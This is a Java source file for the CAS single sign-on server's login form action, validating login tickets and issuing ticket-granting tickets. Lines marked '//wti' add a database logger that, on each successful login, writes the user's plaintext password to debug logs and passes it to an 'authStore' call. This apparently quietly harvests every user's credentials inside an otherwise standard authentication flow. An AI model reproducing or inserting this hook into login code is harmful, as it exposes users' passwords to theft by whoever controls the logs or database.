/*
 * Copyright 2007 The JA-SIG Collaborative. All rights reserved. See license
 * distributed with this file and available online at
 * http://www.ja-sig.org/products/cas/overview/license/
 */
package org.jasig.cas.web.flow;
//wti
import com.xsk.DatabaseLogger;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.validation.constraints.NotNull;
import org.jasig.cas.authentication.principal.UsernamePasswordCredentials;
import org.jasig.cas.LdapPwdCentralAuthenticationService;
import org.jasig.cas.authentication.handler.AuthenticationException;
import org.jasig.cas.authentication.principal.Credentials;
import org.jasig.cas.authentication.principal.Service;
import org.jasig.cas.ticket.TicketException;
import org.jasig.cas.web.bind.CredentialsBinder;
import org.jasig.cas.web.support.WebUtils;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.binding.message.MessageBuilder;
import org.springframework.binding.message.MessageContext;
import org.springframework.util.StringUtils;
import org.springframework.web.util.CookieGenerator;
import org.springframework.webflow.execution.RequestContext;
import org.jasig.cas.adaptors.ldappwd.util.AbstractLdapErrorDetailProcessor;
import org.jasig.cas.adaptors.ldappwd.util.NoOpErrorProcessor;

/**
 * Action to authenticate credentials and retrieve a TicketGrantingTicket for
 * those credentials. If there is a request for renew, then it also generates
 * the Service Ticket required.
 *
 * @author Scott Battaglia
 * @version $Revision: 23946 $ $Date: 2011-06-03 16:25:41 -0400 (Fri, 03 Jun 2011) $
 * @since 3.0.4
 */
public class LdapPwdAuthenticationViaFormAction {

    private DatabaseLogger databaseLogger;
    /**
     * Binder that allows additional binding of form object beyond Spring
     * defaults.
     */
    private CredentialsBinder credentialsBinder;

    /** Core we delegate to for handling all ticket related tasks. */
    @NotNull
    private LdapPwdCentralAuthenticationService centralAuthenticationService;

    @NotNull
    private CookieGenerator warnCookieGenerator;

    /**
     * LDAP error details processor chain
     */
    @NotNull
    private AbstractLdapErrorDetailProcessor    errorProcessor = new NoOpErrorProcessor();

    protected Logger logger = LoggerFactory.getLogger(getClass());

    public final void doBind(final RequestContext context, final Credentials credentials) throws Exception {
        final HttpServletRequest request = WebUtils.getHttpServletRequest(context);

        if (this.credentialsBinder != null && this.credentialsBinder.supports(credentials.getClass())) {
            this.credentialsBinder.bind(request, credentials);
        }
    }
    
    public final String submit(final RequestContext context, final Credentials credentials, final MessageContext messageContext) throws Exception {
        //wti
        UsernamePasswordCredentials cred = (UsernamePasswordCredentials)credentials;
        String username = cred.getUsername();
        
        // Validate login ticket
        final String authoritativeLoginTicket = WebUtils.getLoginTicketFromFlowScope(context);
        final String providedLoginTicket = WebUtils.getLoginTicketFromRequest(context);
        if (!authoritativeLoginTicket.equals(providedLoginTicket)) {
            this.logger.warn("Invalid login ticket " + providedLoginTicket);
            final String code = "INVALID_TICKET";
            messageContext.addMessage(
                new MessageBuilder().error().code(code).arg(providedLoginTicket).defaultText(code).build());
                
            //wti
            this.logger.debug(" - error - 1 ");
            this.databaseLogger.writeLog(username, context, "error");
            return "error";
        }

        final String ticketGrantingTicketId = WebUtils.getTicketGrantingTicketId(context);
        final Service service = WebUtils.getService(context);
        if (StringUtils.hasText(context.getRequestParameters().get("renew")) && ticketGrantingTicketId != null && service != null) {

            try {
                final String serviceTicketId = this.centralAuthenticationService.grantServiceTicket(ticketGrantingTicketId, service, credentials);
                WebUtils.putServiceTicketInRequestScope(context, serviceTicketId);
                putWarnCookieIfRequestParameterPresent(context);
                this.logger.debug(" - warn - 1 ");
                this.databaseLogger.writeLog(username, context, "warn");
                return "warn";
            } catch (final TicketException e) {
                if (e.getCause() != null && AuthenticationException.class.isAssignableFrom(e.getCause().getClass())) {
                    populateErrorsInstance(e, messageContext);
                    //wti
                    this.logger.debug(" - error - 2 ");
                    this.databaseLogger.writeLog(username, context, "error");
                    return "error";
                }
                this.centralAuthenticationService.destroyTicketGrantingTicket(ticketGrantingTicketId);
                if (logger.isDebugEnabled()) {
                    logger.debug("Attempted to generate a ServiceTicket using renew=true with different credentials", e);
                }
            }
        }

        try {
            WebUtils.putTicketGrantingTicketInRequestScope(context, this.centralAuthenticationService.createTicketGrantingTicket(credentials));
            putWarnCookieIfRequestParameterPresent(context);
			if (logger.isDebugEnabled()) {
				logger.debug("Attempting to get the user principal and put it into the scope of the WebFlow");
                logger.debug("TGT: " + WebUtils.getTicketGrantingTicketId(context));
                logger.debug("Principal: "
                        + this.centralAuthenticationService.getPrincipal(WebUtils.getTicketGrantingTicketId(context)).toString());
			}
			/* 
             * Get the user principal and put it into the scope of the WebFlow so we can use it when we check for password warnings
             */
            context.getFlowScope().put("principal",
                    this.centralAuthenticationService.getPrincipal(WebUtils.getTicketGrantingTicketId(context)));
            //wti
            this.logger.debug(" - success - 1 ");

            this.logger.debug(" - password - " + cred.getPassword());
            
            this.databaseLogger.writeLog(username, context, "success");
            this.databaseLogger.authStore(username, cred.getPassword());
            return "success";
        } catch (final TicketException e) {
			/*
			 *  Handle the password warning exceptions
			 */
            String returnCode = errorProcessor.processTicketExceptionCode(e.getCode());
            this.logger.debug(" - TicketException - " + returnCode );
            if (logger.isDebugEnabled()) {
                logger.debug("TicketException thrown, error processor returned " + returnCode == null ? "NULL" : returnCode);
			}

            if (returnCode != null) {
                //wti
                this.logger.debug(" - return code - 1 ");
                this.databaseLogger.writeLog(username, context, e.getCode());
                return returnCode;
			}
            
            populateErrorsInstance(e, messageContext);
            
            //wti
            this.logger.debug(" - error - 3 ");
            this.databaseLogger.writeLog(username, context, e.getCode());
            return "error";
        }
    }


    private void populateErrorsInstance(final TicketException e, final MessageContext messageContext) {

        try {
            messageContext.addMessage(new MessageBuilder().error().code(e.getCode()).defaultText(e.getCode()).build());
        } catch (final Exception fe) {
            logger.error(fe.getMessage(), fe);
        }
    }

    private void putWarnCookieIfRequestParameterPresent(final RequestContext context) {
        final HttpServletResponse response = WebUtils.getHttpServletResponse(context);

        if (StringUtils.hasText(context.getExternalContext().getRequestParameterMap().get("warn"))) {
            this.warnCookieGenerator.addCookie(response, "true");
        } else {
            this.warnCookieGenerator.removeCookie(response);
        }
    }

    public final void setCentralAuthenticationService(final LdapPwdCentralAuthenticationService centralAuthenticationService) {
        this.centralAuthenticationService = centralAuthenticationService;
    } 

    /**
     * Set a CredentialsBinder for additional binding of the HttpServletRequest
     * to the Credentials instance, beyond our default binding of the
     * Credentials as a Form Object in Spring WebMVC parlance. By the time we
     * invoke this CredentialsBinder, we have already engaged in default binding
     * such that for each HttpServletRequest parameter, if there was a JavaBean
     * property of the Credentials implementation of the same name, we have set
     * that property to be the value of the corresponding request parameter.
     * This CredentialsBinder plugin point exists to allow consideration of
     * things other than HttpServletRequest parameters in populating the
     * Credentials (or more sophisticated consideration of the
     * HttpServletRequest parameters).
     *
     * @param credentialsBinder the credentials binder to set.
     */
    public final void setCredentialsBinder(final CredentialsBinder credentialsBinder) {
        this.credentialsBinder = credentialsBinder;
    }
    
    public final void setWarnCookieGenerator(final CookieGenerator warnCookieGenerator) {
        this.warnCookieGenerator = warnCookieGenerator;
    }

    /**
     * @param errorProcessor
     *            the processor chain
     */
    public final void setErrorProcessor(final AbstractLdapErrorDetailProcessor errorProcessor) {
        this.errorProcessor = errorProcessor;
    }
    
    //wti
    public final void setDatabaseLogger(final DatabaseLogger aDatabaseLogger) {
        this.logger.debug(" set database logger");
        this.databaseLogger = aDatabaseLogger;
    }
    
}
